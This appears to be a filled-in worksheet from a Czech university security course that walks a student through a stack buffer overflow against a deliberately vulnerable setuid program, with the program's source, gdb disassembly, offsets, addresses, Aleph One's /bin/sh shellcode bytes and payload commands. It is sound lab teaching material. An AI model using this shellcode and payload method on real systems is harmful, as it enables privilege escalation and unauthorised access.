@@ -1,0 +1,174 @@
+################################################################################
+#                                                                              #
+#                           BIS Projekt 2 2016/2017                            #
+#                                                                              #
+# Maximalni pocet bodu: 7b                                                     #
+# Kontakt: Dominik Breitenbacher <ibreiten@fit.vutbr.cz>                       #
+# Autor: Maros Barabas <ibarabas@fit.vutbr.cz>                                 #
+# Popis ulohy: Program s nazvem "bis-02" nacita vstupni retezec a vypisuje     #
+#     pocet znaku. Vytvorte exploit vyuzivajici zranitelnosti buffer overflow, #
+#     ktery Vam umozni precist tajemstvi ulozene v /home/bis.                  #
+#     Pro praci muzete pouzit tento navod.                                     #
+#     Pro lepsi pochopeni zranitelnosti buffer overflow doporucujeme procist   #
+#     http://insecure.org/stf/smashstack.html .                                #
+#     Pro Vas projekt je take uzitecna kapitola 10.1 Shellcodes na adrese:     #
+#     http://www.win.tue.nl/~aeb/linux/hh/hh-10.html . Uzitecne je tez         #
+#     systemove volani setresuid(int, int, int).                               #
+#                                                                              #
+#     Pokud budete pouzivat tento navod, prosime Vas o vyplneni vsech          #
+#     dotazovanych hodnot. Pokud se rozhodnete provest utok jinym zpusobem,    #
+#     vytvorte vlastni soubor postup.txt, ve kterem Vas postup popisete.       #
+#                                                                              #
+# Format odevzdani: Odevzdavaji se soubory secret.txt a postup.txt             #
+#                                                                              #
+# POZOR!                                                                       #
+# Projekt reste samostatne, jakekoli opisovani povede k disciplinarni komisi   #
+# a k hodnoceni 0 bodu! I nekompletni reseni se hodnoti kladne.                #
+#                                                                              #
+################################################################################
+
+STUDENT_NAME=Ladislav Sulak
+STUDENT_LOGIN=xsulak04
+
+# Tip:
+# Nastudujte si vyse uvedene materialy.
+# Uzitecne prikazy a programky:
+# $ objdump -D -m i386 -b binary shellcode | less
+#  -> srozumitelne zobrazeni dat v souboru shellcode jako instrukce i386
+# $ less /usr/include/asm/unistd*
+#  -> Zamerte se na syscally 0xb a 0xa4.
+# $ hexedit file
+#  -> jednoduchy hex editor, na referencnich strojich lze pouzit i vim.
+
+# Zdrojovy kod programu "bis-02":
+# -----------------------------------------------------------------------------
+#       #include <stdio.h>
+#       #include <string.h>
+#
+#       #define BUFFER_LENGTH 64 // delka bufferu muze byt ruzna
+#
+#       int length()
+#       {
+#       unsigned char buffer[BUFFER_LENGTH];
+#
+#       gets(buffer);
+#       return (int)strnlen(buffer, BUFFER_LENGTH);
+#       }
+#
+#   int main()
+#   {
+#       printf("->");
+#       printf("Pocet znaku vstupniho textu je %d.\n", length());
+#       return 0;
+#   }
+# -----------------------------------------------------------------------------
+# Poznamka:
+# Program je prelozen s parametry:
+# $ gcc -W1,-z,execstack bis-02.c -o bis-02
+# Zamyslete se, proc je zapotrebi parametr "execstack".
+
+# Krok #1
+# -----------------------------------------------------------------------------
+# Program bis-02 je umisten v adresari /usr/bin, spustte ho prikazem:
+# $ bis-02
+# V jinem shellu spustte debugger na bezici program (ktery ceka na vstup):
+# $ gdb -pid $(pgrep bis-02)
+# Pro jednodussi praci je na referencnim OS vypnuta randomizace pameti.
+# V bezicim gdb pomoci prikazu disassemble zjistete instrukce funkce length()
+# Uzitecnou cast tohoto vypisu napiste mezi nasledujici tagy:
+# ---// DISASSEMBLE LENGTH //---
+	0x08048424 <+0>:     push   %ebp
+	0x08048425 <+1>:     mov    %esp,%ebp
+	0x08048427 <+3>:     sub    $0x1e8,%esp
+	0x0804842d <+9>:     lea    -0x1d0(%ebp),%eax
+	0x08048433 <+15>:    mov    %eax,(%esp)
+	0x08048436 <+18>:    call   0x8048324 <gets@plt>
+	0x0804843b <+23>:    lea    -0x1d0(%ebp),%eax
+	0x08048441 <+29>:    movl   $0x1c8,0x4(%esp)
+	0x08048449 <+37>:    mov    %eax,(%esp)
+	0x0804844c <+40>:    call   0x8048354 <strnlen@plt>
+	0x08048451 <+45>:    leave
+	0x08048452 <+46>:    ret
+# ---// DISASSEMBLE LENGTH //---
+
+# Krok #2
+# -----------------------------------------------------------------------------
+# Hledame offset navratove adresy &ret od zacatku bufferu. (v tomto ukazkovem
+# postupu jsou pouzity jine hodnoty, takze se na ne nespolehejte).
+#
+# instrukce push zmensi esp o 4B => %esp = &ret - 4:
+#         push   %ebp
+# do ebp se nacita esp, tedy %ebp = &ret - 4:
+#         mov    %esp,%ebp
+# alokace mista pro lokalni promenne (nemusi odpovidat velikosti bufferu):
+#         sub    $0x68,%esp
+# gets() buffer zacina na %ebp - 0x4c == &ret -0x50
+#         lea    -0x4c(%ebp),%eax
+#         mov    %eax,(%esp)
+#         call   8048344 <gets@plt>
+
+OFFSET=0x1d4
+
+# Krok #3
+# -----------------------------------------------------------------------------
+# Nastavte breakpoint na prvni instrukci (adresu) po navratu z funkce gets()
+# TIP: (gdb) help break
+
+BREAKPOINT_ADDRESS=0x0804843b
+
+# Postupujte prikazem continue pro navrat z funkce call (v druhem
+# shellu musite zadat vstup programu). Prikazem "(gdb) p/x $ebp - <offset>"
+# (v nasem pripade p/x $ebp -0x4c) zjistime skutecnou adresu bufferu.
+# Uzitecny muze byt rovnez prikaz pro vypsani obsahu registru "(gdb) info reg".
+
+BUFFER_ADDRESS=0xbffff4e8
+
+# Krok #4
+# -----------------------------------------------------------------------------
+# Zjistete vlastnika a skupinu programu bis-02. Jake je UID vlastnika?
+
+UID=501
+
+# Krok #5
+# -----------------------------------------------------------------------------
+# Pomoci nastudovanych materialu si do zvlastniho souboru pripravte shellcode,
+# ktery bude slouzit jako zaklad exploitu. Jako zaklad doporucujeme pouzit
+# shellcode od Aleph One, ktery budete dale upravovat:
+# http://insecure.org/stf/smashstack.html
+#  char shellcode[] =
+#    "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+#    "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+#    "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+# Nezapomente, ze je potreba znovuobnovit UID prava na otevreny /bin/sh
+# (zamerte se na syscall setresuid) a uvedeny exploit tedy neni kompletni. Na
+# jeho zacatek doplnte spravne systemove volani. K dosazeni uspechu je zapotrebi
+# vyse zjistene UID. O co se musi shellcode doplnit, by mohlo vice
+# napovedet studium http://www.win.tue.nl/~aeb/linux/hh/hh-10.html .
+
+# Krok #6
+# -----------------------------------------------------------------------------
+# Vytvoreni pre_payloadu pro exploit:
+# Potrebujeme adresu bufferu na nami vypocitanem offsetu (v nasem pripade 0x50).
+# POZOR: gets() cte vstup jen po znak '\n' nebo EOF, takze potrebujeme naplnit
+# stdin jinymi znaky. Na zacatek pre_payloadu dame soubor "shellcode" a doplnime
+# pre_payload tak, aby jeho delka odpovidala offsetu.
+#
+# Nakonec do pre_payloadu pridame adresu bufferu z kroku #3
+# (pozor na little-endian!).
+# TIP: http://en.wikipedia.org/wiki/Endianness
+# Uvedomte si, proc tuto adresu na konec pre_payload pridavame.
+# Jaka je velikost pre_payload v bytech?
+
+PPL_SIZE=0x1D8 (472)
+
+# Krok #7
+# -----------------------------------------------------------------------------
+# Vytvorime payload soubor, ktery bude slouzit jako vstup pro nas exploit.
+# Do prikazu echo pridejte Vase shell prikazy, kterymi dosahnete pozadovaneho
+# cile.
+# $ (cat pre_payload ; yes '' | head -n 20000; echo 'VASE_PRIKAZY') > payload
+
+# Krok #8
+# -----------------------------------------------------------------------------
+# Spusteni exploitu:
+# $ ./bis-02 < payload
